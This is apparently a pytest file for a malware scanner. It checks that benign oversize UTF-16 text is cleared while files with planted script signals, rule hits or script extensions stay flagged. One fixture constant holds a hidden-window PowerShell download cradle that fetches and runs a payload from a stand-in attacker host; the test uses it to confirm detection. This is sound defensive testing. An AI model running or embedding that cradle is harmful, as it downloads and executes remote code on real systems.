"""Spot-audit micro-fix tests (ARGUS.EXE v1.1.0, unreleased).

The script-routing spot audit passed placement independence but
found one false positive and one folding limit:

- Item 1 (FIXED here) — the benign UTF-16 text FP. Any benign
  UTF-16LE text file over the 4 MiB script decode cap was floored
  to Suspicious 40 (script_extension_mismatch 15 +
  oversize_not_fully_analyzed 25): the P0-5 oversize SCRIPT floor
  applied to anything content-routed as script, and all UTF-16
  text routes as script. The floor is now WAIVED for exactly one
  shape: content-only routing (no script extension — the file
  never claimed to be code), zero rule detections across the full
  raw + folded streaming passes, AND zero heuristic script
  signals in every decoded window actually read. Any rule hit or
  any script signal anywhere keeps the floor exactly as before;
  a script extension keeps it unconditionally.
- Item 2 (DOCUMENTED, no code) — the parity-flip folding limit:
  see docs/ROADMAP.md, "Known limit — UTF-16 parity flips".
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from argus.detections import Verdict  # noqa: E402
from argus.rules import BUILTIN_RULES  # noqa: E402
from argus.scanner import scan_file  # noqa: E402
from argus.signatures import SignatureDB, init_db  # noqa: E402

MIB = 1024 * 1024

PROSE_SENTENCE = (
    "The quarterly export completed without incident and every "
    "record was written in order for the archive team to review.\n"
)

CRADLE = (
    "powershell -nop -w hidden -c \"IEX (New-Object "
    "Net.WebClient).DownloadString('http://evil.example/payload.ps1')\""
)
CRADLE_U16 = CRADLE.encode("utf-16-le")


def _prose_u16(min_bytes: int) -> bytes:
    """Pure-prose UTF-16LE text of at least *min_bytes*."""
    reps = min_bytes // (len(PROSE_SENTENCE) * 2) + 1
    return (PROSE_SENTENCE * reps).encode("utf-16-le")


@pytest.fixture()
def db(tmp_path):
    path = tmp_path / "sigs.sigdb"
    init_db(path)
    database = SignatureDB.open(path)
    yield database
    database.close()


def _signal_names(scanned) -> set[str]:
    return {s.name for s in scanned.assessment.signals}


# ======================================================================
# Item 1(a) — benign oversize UTF-16 text is Clean (the FP)
# ======================================================================
def test_spotaudit_waiver_benign_oversize_utf16_txt_is_clean(db, tmp_path):
    """A customer's 5 MiB UTF-16 log/export: plain prose end to
    end, content-routed as script only because UTF-16 text routes
    that way. It must read Clean — the mismatch note (15) stays,
    the oversize floor (25) is waived."""
    target = tmp_path / "big-export.txt"
    target.write_bytes(_prose_u16(5 * MIB))
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.assessment.detections == []
    assert "oversize_not_fully_analyzed" not in _signal_names(scanned)
    assert scanned.assessment.score == 15  # the mismatch note only
    assert scanned.verdict is Verdict.CLEAN


def test_spotaudit_waiver_benign_oversize_utf16_log_is_clean(db, tmp_path):
    target = tmp_path / "archive.log"
    target.write_bytes(_prose_u16(5 * MIB))
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.assessment.detections == []
    assert "oversize_not_fully_analyzed" not in _signal_names(scanned)
    assert scanned.verdict is Verdict.CLEAN


# ======================================================================
# Item 1(b) — cradle signals in decoded windows past the cap:
# the floor still applies
# ======================================================================
def test_spotaudit_floor_kept_when_cradle_beyond_decode_cap(db, tmp_path):
    """A UTF-16 cradle parked just past the 5 MiB chunk boundary
    (beyond the 4 MiB decode cap, inside a decoded window): its
    heuristic signals exist, so the waiver cannot fire — the
    floor stands and the file is convicted, not Clean."""
    body = _prose_u16(5 * MIB + 2048)
    body = body[: 5 * MIB + 2048] + CRADLE_U16 + _prose_u16(1 * MIB)
    target = tmp_path / "parked.txt"
    target.write_bytes(body)
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert "powershell_download_cradle" in _signal_names(scanned)
    assert "oversize_not_fully_analyzed" in _signal_names(scanned)
    assert any(
        d.name == "Suspicious_PowerShell_Download"
        for d in scanned.assessment.detections
    )
    assert scanned.verdict is Verdict.MALICIOUS


# ======================================================================
# Item 1(c) — ONE heuristic script signal past the cap, rule layer
# silent: the heuristic half alone keeps the floor
# ======================================================================
def test_spotaudit_floor_kept_when_single_script_signal_beyond_cap(
    db, tmp_path
):
    """A 5,000-character unbroken blob (the very_long_script_line
    shape) inside the UTF-16 prose at 5 MiB. No rule pattern
    matches it — detections are EMPTY — so the only thing that
    can keep the floor is the one script signal in a decoded
    window past the cap. It does."""
    blob = ("A" * 5000).encode("utf-16-le")
    body = _prose_u16(5 * MIB + 2048)
    body = body[: 5 * MIB + 2048] + blob + _prose_u16(1 * MIB)
    target = tmp_path / "one-signal.txt"
    target.write_bytes(body)
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.assessment.detections == []  # rule layer silent
    assert "very_long_script_line" in _signal_names(scanned)
    assert "oversize_not_fully_analyzed" in _signal_names(scanned)
    assert scanned.verdict is Verdict.SUSPICIOUS


# ======================================================================
# Item 1, rule half — a rule hit with ZERO script signals also
# keeps the floor
# ======================================================================
def test_spotaudit_floor_kept_when_rule_hit_but_no_script_signal(
    db, tmp_path
):
    """The prose mentions Net.WebClient (a rule pattern) with no
    URL and no invoke — the script library stays silent, but the
    folded rule pass detects it. The waiver needs BOTH halves
    silent; the rule hit alone keeps the floor."""
    mention = (
        "The old export tool used Net.WebClient for its "
        "transfers between offices.\n"
    )
    body = mention.encode("utf-16-le") + _prose_u16(5 * MIB)
    target = tmp_path / "mention.txt"
    target.write_bytes(body)
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert any(
        d.name == "Suspicious_PowerShell_Download"
        for d in scanned.assessment.detections
    )
    script_signal_names = _signal_names(scanned) - {
        "script_extension_mismatch",
        "oversize_not_fully_analyzed",
    }
    assert script_signal_names == set()  # heuristic half was silent
    assert "oversize_not_fully_analyzed" in _signal_names(scanned)
    assert scanned.verdict is Verdict.SUSPICIOUS


# ======================================================================
# Item 1, extension half — a script extension keeps the floor
# unconditionally (code by claim)
# ======================================================================
def test_spotaudit_floor_unconditional_for_script_extension(db, tmp_path):
    """The same pure prose wearing a .ps1 name: a script
    extension is a claim to be code, so the oversize floor
    applies exactly as before even with zero signals and zero
    rule hits anywhere."""
    target = tmp_path / "innocent.ps1"
    target.write_bytes(_prose_u16(5 * MIB))
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.assessment.detections == []
    assert "oversize_not_fully_analyzed" in _signal_names(scanned)
    assert scanned.assessment.score == 25  # the floor alone
    assert scanned.verdict is Verdict.SUSPICIOUS


# ======================================================================
# Item 1, GUI path — the worker's re-analysis reaches the same
# verdict (one shared waiver helper, no divergence)
# ======================================================================
def test_spotaudit_gui_worker_agrees_on_benign_oversize_utf16(
    tmp_path, monkeypatch
):
    """The GUI scan worker scans with heuristics off and applies
    its own heuristic pass over a FRESH report — the fresh floor
    must be waived there too, or the GUI would re-floor a file
    the engine cleared. Runs the real ScanWorker offscreen;
    skips where PySide6 is unavailable."""
    pytest.importorskip("PySide6", reason="PySide6 not installed")
    from PySide6.QtWidgets import QApplication

    QApplication.instance() or QApplication([])
    data_root = tmp_path / "argus-data"
    data_root.mkdir()
    monkeypatch.setenv("ARGUS_DATA_DIR", str(data_root))
    from argus.gui.backend import GuiBackend, ScanWorker

    db_path = tmp_path / "signatures.sigdb"
    init_db(db_path, seed=True)
    backend = GuiBackend(
        config_path=tmp_path / "argus-config.json",
        devtools_path=tmp_path / "devtools.json",
    )
    backend.config.signature_db = str(db_path)
    backend.config.watch_dirs = [str(tmp_path)]
    backend.config.vault_dir = str(tmp_path / "vault")
    backend.config.history_db = str(tmp_path / "history.db")
    backend.config.status_file = str(tmp_path / "status.json")
    backend.save_config()

    landing = tmp_path / "landing"
    landing.mkdir()
    target = landing / "big-export.txt"
    target.write_bytes(_prose_u16(5 * MIB))

    summary = ScanWorker(backend).execute([landing])
    scanned = next(
        f for f in summary["scanned_files"] if f.result.path == target
    )
    assert "oversize_not_fully_analyzed" not in _signal_names(scanned)
    assert scanned.verdict is Verdict.CLEAN
